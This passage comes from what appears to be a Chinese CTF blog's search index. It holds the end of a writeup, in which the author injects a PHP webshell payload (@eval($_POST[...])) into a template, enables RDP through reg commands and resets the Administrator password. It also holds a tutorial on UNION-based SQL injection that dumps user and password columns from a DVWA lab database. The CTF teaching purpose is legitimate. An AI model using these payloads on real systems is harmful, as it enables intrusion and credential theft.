class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> <strong>平行越权</strong>：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt=""><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt=""><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">删除注册表</div><div class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</div><div class="line">添加注册表</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p>
<p>修改密码<code>net user Administrator (复杂的密码)</code><br>打开远程桌面连接，账号administrator 密码<br>桌面上得到flag</p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL注入]]></title>
      <url>/2017/08/29/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—</p>
<a id="more"></a>
<p>从最最基础的开始=.= start</p>
<h2 id="SQL注入的基本原理"><a href="#SQL注入的基本原理" class="headerlink" title="SQL注入的基本原理"></a>SQL注入的基本原理</h2><p>  你提交的<strong>任何内容</strong>都会被服务器放入sql语句中执行,于是可以构筑自己的sql语句在服务器端执行。<br>  当然以上所说的是在服务器完全没有防御的情况下，通常都不会这么简单，但是原理是相同。</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ul>
<li>根据注入点(既我们提交内容的位置)情况的不同分为两种：<ul>
<li>字符型注入: 提交的内容<strong>会</strong>在服务端处左右会被加上’‘</li>
<li>数字型注入: 提交的内容<strong>不会</strong>在服务端处加上’‘<br>以上两种注入的区别在于：字符型注入需要用各种方法闭合单引号,屏蔽单引号等，而数字型注入不用，即数字型相对简单。</li>
</ul>
</li>
<li>根据对于注入结果服务端会显示给攻击者与否分两种：<ul>
<li>有回显的sql注入：有显示查询结果或错误信息</li>
<li>sql盲注：没有显示直接结果或错误。但仍然由办法提取信息，sql盲注较为复杂又分为<strong>布尔型盲注</strong>和<strong>时间型盲注入</strong><ul>
<li>布尔型盲注：返回状态只有两种情况，通常为有显示true和无显示false，借此来判断是否成功。</li>
<li>时间型盲注：返回状态没有任何区别，若成功人为制造延迟时间延迟，以此来判断是否成功。<br>此篇会详细介绍有回显的sql注入，sql盲注另开一篇</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="简单的了解数据库的结构"><a href="#简单的了解数据库的结构" class="headerlink" title="简单的了解数据库的结构"></a>简单的了解数据库的结构</h2><p>  数据库 &gt; 表 &gt; 列<br>  数据库中的库名，表名，列名等基本信息会存储在information_schema这个数据库中tables，columns的表内。</p>
<table>
<thead>
<tr>
<th style="text-align:center">%</th>
<th style="text-align:center">数据库</th>
<th style="text-align:center">表</th>
<th style="text-align:center">列 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">  英文</td>
<td style="text-align:center">schema</td>
<td style="text-align:center">table</td>
<td style="text-align:center">column</td>
</tr>
<tr>
<td style="text-align:center">  信息库中的列名</td>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">table_name</td>
<td style="text-align:center">column_name</td>
</tr>
</tbody>
</table>
<h2 id="字符型SQL注入的步骤"><a href="#字符型SQL注入的步骤" class="headerlink" title="字符型SQL注入的步骤"></a>字符型SQL注入的步骤</h2><p>  首先sql注入的<strong>核心</strong>就是去探测收集服务器的信息，再<strong>推测判断服务器sql语句</strong>的构成，再加以利用得到自己想要的数据即FLAG。</p>
<p>  以下以<strong>最基础的字符型注入</strong>为例，为了方便理解，服务端的sql语句以下为例<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> 列 <span class="keyword">from</span> 数据库.表 <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'$name'</span></div></pre></td></tr></table></figure></p>
<h3 id="1-判断是否有SQL注入点"><a href="#1-判断是否有SQL注入点" class="headerlink" title="1.判断是否有SQL注入点"></a>1.判断是否有SQL注入点</h3><p>判断sql注入点：服务器会对我们除了正常输入以外的测试语句有反应</p>
<ul>
<li>报错</li>
<li>可以影响到查询结果</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$name= 1' and '1' = '1    (前后闭合’‘，此处应该返回正确的页面，即与$name=1一样)</div><div class="line"></div><div class="line">$name= 1' and '1' = '2    (前后闭合’‘, 此处应该返回数据库错误的信息，即与$name=1不同)</div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> 列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'1'</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p>在确认有注入漏洞之后，探测sql语句组成</p>
<h3 id="2-判断select语句中有几列"><a href="#2-判断select语句中有几列" class="headerlink" title="2.判断select语句中有几列"></a>2.判断select语句中有几列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=1' order by 数字n <span class="comment">--+  （--+ 为url编码后的 --(空格) 是注释符，用于屏蔽后面的‘）</span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> 列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">order</span> <span class="keyword">by</span> 数字n <span class="comment">-- ’</span></div></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.w3school.com.cn/sql/sql_orderby.asp" target="_blank" rel="external">order by</a> 列名  （列名可以为select语句中列的序号,name,age——-&gt;1,2）</p>
</blockquote>
<p>因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果</p>
<p>假设结果 n=2 列</p>
<h3 id="3-判断显示的信息是第几列的信息"><a href="#3-判断显示的信息是第几列的信息" class="headerlink" title="3.判断显示的信息是第几列的信息"></a>3.判断显示的信息是第几列的信息</h3><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。<br>通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)<br>union select 1,2 通过显示的数字来确定显示的列的位置<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">--+</span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> n列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
<p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
<h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">--+</span></div><div class="line"></div><div class="line">全局：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
<p>如果为root用户，就可以访问information_schema数据库</p>
<blockquote>
<p>n个月后，当我在配置mysql比赛环境的时候，第一次用到了除了ROOT用户以外的其他用户。<br>创建了一个新的用户，修改了它的权限。发现它竟然也可以直接访问information_schema表<br>三观崩坏的同时，去查了一波资料<br>mysql每个用户都可以访问information_schema，且没法设置不能访问，但是不用担心权限问题，因为information_schema里面的内容会根据用户权限而变化。即该用户只能从information_schema里面查询到自己有权限查看的库和表等<br>同时因为CTF题目而产生的美丽的误会，大致是因为题目单独对于information_schema进行了过滤，才访问不到的</p>
</blockquote>
<p>所以，不要因为不是root账户，就不去尝试这个最省事的办法！<br>都需要先尝试访问information_schema!</p>
<h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,table_schema <span class="keyword">from</span> information_schema.tables <span class="comment">--+</span></div><div class="line"></div><div class="line">查询数据库中有多少个表</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_schema,count(*) from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库中的表名</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="comment">--+</span></div><div class="line"></div><div class="line">查询指定数据库指定表中的列名</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_name,column_name from information_schema.columns where table_schema='</span>dvwa<span class="string">' and table_name='</span><span class="keyword">users</span><span class="string">'--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表的列的内容</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> dvwa.users <span class="comment">--+</span></div><div class="line"></div><div class="line">查询链接显示</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select null,concat_ws('</span> : <span class="string">',user,password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="string">' : '</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users <span class="comment">--(空格)</span></div><div class="line">ps. <span class="string">':'</span> 编码<span class="comment">---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
<h3 id="6-无法访问时，猜解列名，表名，库名"><a href="#6-无法访问时，猜解列名，表名，库名" class="headerlink" title="6.无法访问时，猜解列名，表名，库名"></a>6.无法访问时，猜解列名，表名，库名</h3><p>  当无法访问information_schema库时<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=' and column is null <span class="comment">--+    </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="literal">null</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
<p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名<span class="comment">------已猜出列名</span></div><div class="line">$name=' and table.user is null <span class="comment">--+	</span></div><div class="line"></div><div class="line">3.猜解当前数据库名<span class="comment">--已猜出列名，表名</span></div><div class="line">$name=' and db.table.user is null <span class="comment">--+</span></div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line">$name=' and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">table</span>)&gt;<span class="number">0</span> <span class="comment">--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
<p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
<h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$name=1 and 1=1 #</div></pre></td></tr></table></figure></p>
<p>区别：</p>
<ul>
<li>不用考虑 ’ 闭合问题</li>
<li>输入字符’a’时  把需要的字符串变为Ox16进制 </li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;<a href="https://lalajun.github.io/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/#more" target="_blank" rel="external">sql盲注</a></p>
<h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
<li>char（）—-&gt; ASCII码 变为 字符</li>
<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">concat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
<li><a href="https://www.cnblogs.com/lijiageng/p/6511334.html" target="_blank" rel="external">substring()等</a>  —–&gt; 分割字符串提取自己想要查看的</li>
<li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
<li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
<li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
<li>or  前面语句<strong>正确</strong>后面语句不执行</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
